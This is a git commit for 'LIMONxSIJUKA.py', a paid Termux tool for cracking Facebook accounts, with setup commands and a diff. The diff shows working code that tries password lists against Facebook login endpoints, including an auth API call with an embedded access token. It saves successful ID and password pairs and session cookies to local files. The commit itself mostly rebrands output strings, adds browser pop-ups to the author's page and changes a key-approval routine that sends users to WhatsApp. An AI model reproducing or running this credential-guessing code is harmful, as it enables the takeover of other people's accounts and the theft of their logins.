3e1448c2387ba57da7dcab6f890694831109deb8
LMNxJOHNY <145145650+LMNx9-JOHNY@users.noreply.github.com>
2023-09-17 18:50:39 +0600

    LIMONxSIJUKA.py
    🔥🔥 LIMONxSIJUKA  Crack All 🔥🔥
            💯💚Random Old +File💚💯
           😍😍Data+WIFI😍😍
    
    Note : Tool is Paid , But Free Approval for my group members 💚
    
    Command ;
    
    pkg update && pkg upgrade
    pkg install python
    pkg install git
    pip install requests
    pip install bs4
    pip install rich
    pip install michanize
    pip install future
    pip install urllib3
    git clone https://github.com/LMNx9-JOHNY/LIMONxSIJUKA-Clone.git
    cd LIMONxSIJUKA-Clone
    python LIMONxSIJUKA.py

--- LIMONxSIJUKA.py
+++ LIMONxSIJUKA.py
@@ -84,14 +84,14 @@ def clear():
 def back():
 	login()
 
-ahsan="x9"
+ahsan="SIJUKA=="
 imt="-LMNx9=="
-ak="LS"
+ak="LIMONx"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.LMNx9-cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.LMNx9-cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
 def login():
@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ LS➳ ᴹᴿ᭄LIMON  ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ LS⳼ᴹᴿ᭄LIMON  ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ LS➳ ᴹᴿ᭄LIMON -CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ LS⳼ᴹᴿ᭄LIMON -CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ LS➳ ᴹᴿ᭄LIMON -OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ LS⳼ᴹᴿ᭄LIMON -OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ LS➳ ᴹᴿ᭄LIMON  ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ LS⳼ᴹᴿ᭄LIMON  ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ LS➳ ᴹᴿ᭄LIMON -CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ LS⳼ᴹᴿ᭄LIMON -CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ LS➳ ᴹᴿ᭄LIMON -OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ LS⳼ᴹᴿ᭄LIMON -OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/LS➳ ᴹᴿ᭄LIMON -OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/LS⳼ᴹᴿ᭄LIMON -OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -411,7 +411,6 @@ logo = ("""
                                                             
                                                             
                                                          
-
 \033[1;92m ༄Ms.᭄\x1b[1;91m════════════════════════════════════════════\x1b[1;92m༄SIJJUKA᭄
 \033[1;92m ༄Ms.᭄\x1b[1;90m════════════════════════════════════════════\x1b[1;92m༄SIJJUKA᭄
         \x1b[1;92m╔══════════════════════════════════════╗
@@ -420,10 +419,14 @@ logo = ("""
         \x1b[1;92m    GITHUB      :   git.me/LMNx9-JOHNY   
         \x1b[1;92m    FACEBOOK    :   Lj.LMNx9                 
         \x1b[1;92m    Group       :   Dark Team LMNx9        
-        \x1b[1;92m    WHATSAPP    :   [ +880198265557* ]      
+        \x1b[1;92m    WHATSAPP    :   [ +880198265557* ]   
+            Stutus      :    Paid
+            Version     :    0.2
         \x1b[1;92m╚══════════════════════════════════════╝
 \033[1;92m ༄Mr.᭄\x1b[1;90m════════════════════════════════════════════\x1b[1;92m༄LIMON ᭄
-\033[1;92m ༄Mr.᭄\x1b[1;91m════════════════════════════════════════════\x1b[1;92m༄LIMON ᭄""")
+\033[1;92m ༄Mr.᭄\x1b[1;91m════════════════════════════════════════════\x1b[1;92m༄LIMON ᭄ """)
+
+os.system("xdg-open https://www.facebook.com/LJ.LMNx9?mibextid=nW3QTL")
 
 class Main:
 	def __init__(self):
@@ -435,7 +438,7 @@ class Main:
 		print(logo)
 		print("\n [1] File Cloning [ Just Now Login ]")
 		print(" [2] Public Cloning [ Just Now Login ]")
-		print(" [3] Create File [ Not Working ]")
+		print(" [3] Create File [ VPN Work ]")
 		print(" [4] 2008-2010 Cloning [ 70% Just Now Login ]")
 		print(" [5] 2011-2014 Cloning [ 70% Just Now Login ]")
 		print(" [E] Exit Programming\n")
@@ -480,6 +483,7 @@ class Main:
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
 				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
 				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
+				os.system("xdg-open https://www.facebook.com/LJ.LMNx9?mibextid=nW3QTL")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [>>] CRACK COMPLETE...")
@@ -851,7 +855,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ LS➳ ᴹᴿ᭄LIMON  ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ LS⳼ᴹᴿ᭄LIMON  ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -868,15 +872,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ LS➳ ᴹᴿ᭄LIMON -OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ LS⳼ᴹᴿ᭄LIMON -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-LS➳ ᴹᴿ᭄LIMON -OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-LS⳼ᴹᴿ᭄LIMON -OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ LS➳ ᴹᴿ᭄LIMON -OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ LS⳼ᴹᴿ᭄LIMON -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-LS➳ ᴹᴿ᭄LIMON -OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-LS⳼ᴹᴿ᭄LIMON -OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1278,7 +1282,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [LS➳ ᴹᴿ᭄LIMON  ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [LS⳼ᴹᴿ᭄LIMON  ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1295,15 +1299,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ LS➳ ᴹᴿ᭄LIMON -OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ LS⳼ᴹᴿ᭄LIMON -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-LS➳ ᴹᴿ᭄LIMON -OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-LS⳼ᴹᴿ᭄LIMON -OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ LS➳ ᴹᴿ᭄LIMON-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ LS⳼ᴹᴿ᭄LIMON-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-LS➳ ᴹᴿ᭄LIMON-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-LS⳼ᴹᴿ᭄LIMON-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1312,7 +1316,7 @@ class Main:
 
 
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.LMNx9-cov', 'r').read()
 	clear()
 	print(logo)
 	r1=requests.get("https://raw.githubusercontent.com/LMNx9-JOHNY/LIMONxSIJUKA/main/Approval.txt").text
@@ -1328,7 +1332,7 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m LIMONxSIJJUKA  Tool Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m ⳹෴LIMONxSIJUKA෴⳼ \033[1;92m Tool Paid You Need Get Approved First\033[1;37m\n")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
@@ -1340,7 +1344,7 @@ def Subscraption():
 		print ("")
 		input(" Press Enter To Send Key Admin Whatsapp")
 		time.sleep(3.5)
-		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
+		tks = 'Dear%20Sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
 		os.system('am start https://wa.me/+8801982655576?text=' + tks)
 		Subscraption()        
 Subscraption()
